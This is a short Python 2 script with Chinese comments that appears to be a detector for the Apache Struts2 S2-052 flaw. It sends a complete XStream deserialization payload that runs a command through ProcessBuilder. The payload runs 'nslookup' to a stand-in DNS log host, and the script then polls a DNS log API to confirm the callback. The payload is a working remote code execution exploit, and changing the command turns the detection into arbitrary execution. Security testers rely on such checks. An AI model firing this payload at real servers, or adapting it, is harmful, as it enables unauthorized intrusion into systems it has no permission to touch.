#-*- coding:utf-8 -*-
# struts2-052 检测
# author: secboom.com & Mosuan

import sys
import time
import requests

def main(url):
	# 初始化状态
	status = False
	# dnslog api
	auth_url = "http://xxxx"
	# 你的dnslog地址
	dnslog = "0xxx.xxx.com"
	_random = str(int(time.time()))[3:]
	host = _random+"."+dnslog
	header = {
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36",
		"Content-Type": "application/xml",
	}

	payload = """
<map>
	<entry>
	<jdk.nashorn.internal.objects.NativeString>
	<flags>0</flags>
	<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
		<dataHandler>
		<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
		<is class="javax.crypto.CipherInputStream">
		<cipher class="javax.crypto.NullCipher">
		<initialized>false</initialized>
		<opmode>0</opmode>
		<serviceIterator class="javax.imageio.spi.FilterIterator">
		<iter class="javax.imageio.spi.FilterIterator">
		<iter class="java.util.Collections$EmptyIterator"/>
		<next class="java.lang.ProcessBuilder">
			<command>
				<string>nslookup</string><string>%s</string>
			</command>
			<redirectErrorStream>false</redirectErrorStream>
		</next>
		</iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
</entry>
</map>
""" % (host)

	try:
		response = requests.post(url,headers=header, data=payload, timeout=5)
		if response.status_code == 500:
			time.sleep(1)
			response = requests.get(auth_url,timeout=5)
			# 判断dnslog api是否存在log
			if host in response.content:
				status = True
	except Exception,e:
		pass

	if status:
		print(u"[**][url]: %s 存在struts2-052漏洞" % url)
	else:
		print(u"不存在的")

if __name__ == '__main__':
	url = sys.argv[1]
	print("Test Struts2-052 by Url: %s" % url)
	main(url)
